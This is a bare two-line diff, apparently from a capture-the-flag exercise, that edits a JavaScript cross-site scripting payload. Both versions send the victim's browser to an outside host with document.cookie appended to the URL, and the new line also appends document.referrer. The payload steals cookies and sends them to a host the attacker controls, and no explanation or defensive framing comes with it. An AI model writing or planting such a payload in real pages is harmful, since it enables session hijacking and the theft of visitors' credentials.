@@ -1,1 +1,1 @@
-window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie;
+window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie + document.referrer;
